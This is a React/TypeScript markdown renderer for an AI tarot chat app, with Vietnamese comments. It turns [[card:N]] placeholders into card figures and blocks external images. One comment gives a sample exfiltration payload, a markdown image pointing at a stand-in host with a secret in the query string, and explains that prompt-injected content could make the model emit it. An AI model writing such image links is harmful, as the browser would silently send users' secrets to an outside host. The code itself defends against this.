import { memo, type ReactNode } from 'react'
import { MarkdownTextPrimitive } from '@assistant-ui/react-markdown'
import remarkGfm from 'remark-gfm'
import { CardFigure } from '../tarot/CardFigure'
import { useMessageMeta } from './meta'
import classes from './Markdown.module.css'

const CARD_SLOT = /^[ \t]*\[\[card:(\d+)\]\][ \t]*$/gm
const CARD_SRC = /^#card-(\d+)$/

/**
 * Mã [[card:N]] nằm riêng một dòng là chỗ đặt lá thứ N. Đổi nó thành một ảnh
 * markdown trỏ tới "#card-N" để trình render markdown giữ đúng vị trí, rồi thay
 * ảnh đó bằng thẻ lá thật. Mã chỉ gõ được nửa chừng trong lúc stream ("[[ca")
 * thì ẩn đi cho tới khi đủ.
 */
function preprocess(text: string): string {
  return text.replace(CARD_SLOT, '\n![](#card-$1)\n').replace(/\[\[c?a?r?d?:?\d*\]?$/, '')
}

function CardSlot({ src }: { src?: string }) {
  const { cards } = useMessageMeta()
  const index = Number(src?.match(CARD_SRC)?.[1] ?? 0) - 1
  const card = cards?.[index]
  return card ? <CardFigure card={card} /> : null
}

/**
 * Hằng số cấp module, không tạo trong lúc render: mỗi object mới là một bộ
 * component mới, React dỡ và dựng lại cả cây markdown ở mỗi token — thẻ lá chạy
 * lại animation lật mãi nên gần như không bao giờ thấy được ảnh.
 */
const COMPONENTS = {
  // Thẻ lá là <figure>; nằm trong <p> là HTML sai, nên đoạn văn dùng <div>.
  p: ({ children }: { children?: ReactNode }) => <div className={classes.paragraph}>{children}</div>,
  // Chỉ ô đặt lá nội bộ. Ảnh ngoài là kênh rò dữ liệu: nội dung bị chèn lệnh vào
  // model có thể viết ![](https://ke-la/?d=<bí mật>) và trình duyệt tự gửi đi khi
  // hiện ảnh — không cần ai bấm gì.
  img: ({ src, alt }: { src?: string | Blob; alt?: string }) =>
    typeof src === 'string' && CARD_SRC.test(src) ? <CardSlot src={src} /> : alt ? <span>{alt}</span> : null,
  // Link phải bấm mới đi, nhưng vẫn chỉ cho http(s) và không gửi referrer.
  a: ({ href, children }: { href?: string; children?: ReactNode }) =>
    href && /^https?:\/\//i.test(href) ? (
      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    ),
}

const REMARK_PLUGINS = [remarkGfm]

function MarkdownTextImpl() {
  return (
    <MarkdownTextPrimitive
      className={classes.markdown}
      remarkPlugins={REMARK_PLUGINS}
      preprocess={preprocess}
      smooth
      components={COMPONENTS}
    />
  )
}

export const MarkdownText = memo(MarkdownTextImpl)
